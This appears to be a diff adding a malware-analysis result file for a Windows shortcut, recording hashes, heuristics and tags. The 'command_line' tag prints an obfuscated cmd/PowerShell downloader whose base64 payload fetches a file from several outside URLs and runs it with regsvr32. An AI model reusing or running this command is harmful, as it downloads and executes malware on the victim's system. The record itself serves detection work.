@@ -1,0 +1,27 @@
+{
+    "response": {
+        "supplementary": [
+            "fbaeaffe99b1086cffed4e294badfa2aa0f2448c8aaeab16639b30e755b5376b"
+        ],
+        "extracted": [
+            "6839792a6b09c969a70980a14e0e5874bf2cf0bfb454e28b2b61e9fc43e1d634"
+        ]
+    },
+    "result": {
+        "heuristics": [
+            1,
+            4
+        ],
+        "tags": {
+            "file.shortcut.icon_location": [
+                "shell32.dll"
+            ],
+            "file.shortcut.command_line": [
+                "..\\..\\Windows\\system32\\cmd.exe /v:on /c TCO+Ku2odUc9JiHURdv4p+613Dq/BuBJ3BvYxNkFN3+8voXBH97lO4vxzSs2s51eNtm01shY||goto&p^o^w^e^r^s^h^e^l^l.e^x^e -c \"&{ iex ([string][System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2hvMjgwMzE5MDAxLmhvZ2liby5uZXQvaW5jbHVkZS90Z1F3eGljNFF3dU0vIiwiaHR0cDovL3d3dy5nZXJvbnRvZ2VyaWF0cmlhLm9yZy90bXAvY0I2Y2dUVmZ5eVozYjF3OWQvIiwiaHR0cDovL2NsdWJtYW5hZ2VyLm5ldC5hci9wcnVlYmEvVk5xc3gzNjhGSHFLSy8iLCJodHRwOi8vbXltaWNyb2dyZWVuLm1pZ2h0Y29kZS5jb20vRm94LUMvbmhNWXdrRlhCLyIsImh0dHA6Ly90b3dhcmRzdW4ubmV0L2FkbWluLzhOVzJUSmVQczhkWmhiLyIsImh0dHA6Ly9oa3dpbmRzYWNhZGVteS5zeW5vbG9neS5tZS9AZWFEaXIvcUgyRUh1dllWb0pFSjIvIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL0R3RVhyY2dOWGouUXlVO1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvRHdFWHJjZ05Yai5ReVU7YnJlYWt9IGNhdGNoIHsgfX0='))) }\""
+            ],
+            "file.name.extracted": [
+                "cmd.exe"
+            ]
+        }
+    }
+}
